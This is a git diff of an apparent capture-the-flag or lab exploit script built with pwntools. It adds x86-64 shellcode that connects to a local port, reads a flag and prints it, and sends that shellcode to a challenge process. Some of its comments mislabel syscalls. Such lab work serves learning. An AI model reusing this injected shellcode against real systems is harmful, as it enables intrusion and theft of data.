@@ -243,8 +243,6 @@ def task_2_asm_byte():
 
 
 def task_3_asm_byte():
-    global start_code_address
-    virtual_memory_address = start_code_address + 5*0x10000 + 0x1000 # shmaddr need to align to page (4096 = 0x1000)
     # 1. sys_shmget
     #    -> create or access a share memory
     # 2. shmat
@@ -306,6 +304,150 @@ def task_3_asm_byte():
     return send_line
 
 
+def task_4_asm_byte():
+    global start_code_address
+    sockaddr_memory_address = start_code_address + 5*0x10000 + 0x1000
+    flag3_memory_address = start_code_address + 5*0x10000 + 0x8000
+    debug_memory_address = start_code_address + 6*0x10000
+
+    # socket -> connect -> read from server to get flag
+    # 1. sys_socket
+    #    man page: https://man7.org/linux/man-pages/man2/socket.2.html
+    #              https://man7.org/linux/man-pages/man7/ip.7.html (IPv4 protocol)
+    #    const(family, type) define: define: https://students.mimuw.edu.pl/SO/Linux/Kod/include/linux/socket.h.html
+    # rax: shmat syscall number 41
+    # rdi: int family - AF_INET (ipv4) is 2(dec)
+    # rsi: int type - SOCK_STREAM is 1 (dec) (seen in discussion)
+    # rdx: int protocol - seems like only raw socket(define by type = SOCK_RAW) need to set this, otherwise fill in 0
+    #      -> refer to 2nd man page ref
+    #
+    # return socket fd to rax if successfully create one, otherwise return -1 -> 3 success
+
+    # 2. sys_connect
+    # rax: shmat syscall number 42
+    # rdi: int socket fd from the return value of sys_socket
+    # rsi: struct sockaddr *uservaddr
+    #       refer to struct sockaddr: https://man7.org/linux/man-pages/man7/ip.7.html (Address format part)
+    #       struct sockaddr_in {
+    #           sa_family_t    sin_family; /* address family: AF_INET */        -> 0x0002   (dec) -> 0x0200      2 bytes (little byte ordering)
+    #           in_port_t      sin_port;   /* port in network byte order */     -> 0x1337   (hex) -> 0x3713      2 bytes (little byte ordering)
+    #           struct in_addr sin_addr;   /* internet address */               -> 127.0.0.1 -> 0x 01 00 00 7F   4 bytes (little byte ordering)
+    #       };       
+    #                                                                           -> not enough bytes(14 - 8 = 6) fill in 0 (not sure), refer: https://www.qiniu.com/qfans/qnso-64271249
+    #       ipv4 (32 bit) -> 8 bit(2^8 = 256)(2 hex) each nnn of nnn.nnn.nnn.nnn
+    #       127.0.0.1 -> 0x7F(127) 0x00(0) 0x00(0) 0x01(1) - little byte ordering -> 0x 01 00 00 7F
+    # rdx: int addrlen -> 16 bytes(2 bytes sa_family + 14 bytes sa_data) for ipv4 -> 0x10 (hex)
+    #
+    # return 0 to rax if connect success, else return -1 in error case -> seems like will be error if sockaddr wrong -> [debug]
+    # 0200 3713 0100007F
+    # 2000 1337 7F000001
+
+    # 3. read from socket fd and store the flag to an codeint address
+    # rax: read syscall number 0
+    # rdi: socket fd -> already set in 2. but don't know if will be changed after 2. -> [debug]
+    # rsi: read content from socket fd and store into flag3_memory_address
+    # rdx: count, read 100 byte (flag len)
+
+    # 4. write the content in codeint address to stdout
+    # rax: write syscall number 1
+    # rdi: fd, stdout 1
+    # rsi: write the content from flag3_memory_address -> already set in 3. but don't know if will be changed after 3. -> [debug]
+    # rdx: count, write 100 byte to stdout and end at null terminator (flag len)
+
+    # 5. debug by print the reg
+    #    mov the content in the reg to an codeint address
+    #    write the content in the codeint address to stdout
+
+    # 1. sys_socket return 3
+    #    -> store rax(socket fd) into r11 -> qword ptr [r10]
+    # 2. sys_connect return 3 
+    #    -> store rax into r12
+    # 
+
+    # mov rdi, r11 bad file descriptor??
+
+    # send_line = asm("""mov rax, 41
+    #     mov rdi, 2
+    #     mov rsi, 1
+    #     mov rdx, 0
+    #     syscall
+    #     mov r11, rax
+    #     """) + asm("mov r10, " + str(hex(debug_memory_address))) + asm("""
+    #     mov qword ptr [r10], r11
+    #     mov rax, 1
+    #     mov rdi, 1
+    #     mov rsi, r10
+    #     mov rdx, 8
+    #     syscall
+    #     mov rax, 42
+    #     mov rdi, qword ptr [r10]
+    #     """) + asm("mov r14, " + str(hex(sockaddr_memory_address))) + asm("""
+    #     mov word ptr [r14], 0x0002
+    #     mov word ptr [r14 + 0x2], 0x3713
+    #     mov dword ptr [r14 + 0x4], 0x0100007F
+    #     mov qword ptr [r14 + 0x8], 0x0000000000000000
+    #     mov rsi, r14
+    #     mov rdx, 16
+    #     syscall
+    #     mov r12, rax
+    #     """) + asm("mov r10, " + str(hex(debug_memory_address))) + asm("""
+    #     mov qword ptr [r10 + 0x8], r12
+    #     mov rax, 1
+    #     mov rdi, 1
+    #     mov rsi, r10
+    #     mov rdx, 16
+    #     syscall
+    #     mov rax, 0
+    #     """) + asm("mov r10, " + str(hex(debug_memory_address))) + asm("""
+    #     mov rdi, qword ptr [r10]
+    #     """) + asm("mov rsi, " + str(hex(flag3_memory_address))) + asm("""
+    #     mov rdx, 67
+    #     syscall
+    #     mov rax, 1
+    #     mov rdi, 1
+    #     """) + asm("mov rsi, " + str(hex(flag3_memory_address))) + asm("""
+    #     mov rdx, 67
+    #     syscall
+    #     """)
+
+    # disassembly = disasm(send_line) # Disassemble shellcode
+    # print("disassembly:\n", disassembly)
+
+    # return send_line
+
+    
+    send_line =  asm("""mov rax, 41
+        mov rdi, 2
+        mov rsi, 1
+        mov rdx, 0
+        syscall
+        mov rdi, rax
+        mov rax, 42
+        """) + asm("mov r14, " + str(hex(sockaddr_memory_address))) + asm("""
+        mov word ptr [r14], 0x0002
+        mov word ptr [r14 + 0x2], 0x3713
+        mov dword ptr [r14 + 0x4], 0x0100007F
+        mov qword ptr [r14 + 0x8], 0x0000000000000000
+        mov rsi, r14
+        mov rdx, 16
+        syscall
+        mov rax, 0
+        """) + asm("mov rsi, " + str(hex(flag3_memory_address))) + asm("""
+        mov rdx, 67
+        syscall
+        mov rax, 1
+        mov rdi, 1
+        """) + asm("mov rsi, " + str(hex(flag3_memory_address))) + asm("""
+        mov rdx, 67
+        syscall
+        """)
+
+    disassembly = disasm(send_line) # Disassemble shellcode
+    print("disassembly:\n", disassembly)
+
+    return send_line
+
+
 def exit_0_asm_byte():
     # exit 0
     return asm("""mov rax, 60
@@ -349,7 +491,8 @@ if __name__ == '__main__':
 
 
     # [second send] -> input the asm we want to execute and it will be store into the start of codeint
-    send_line_2 = task_2_asm_byte() + task_3_asm_byte() + exit_0_asm_byte()
+    send_line_2 = task_2_asm_byte() + task_3_asm_byte() + task_4_asm_byte() + exit_0_asm_byte()
+    # send_line_2 = task_4_asm_byte() + exit_0_asm_byte()
     print("send_line_2 to read: ", send_line_2)
     r.send(send_line_2)
     print("after send 2 - 1")
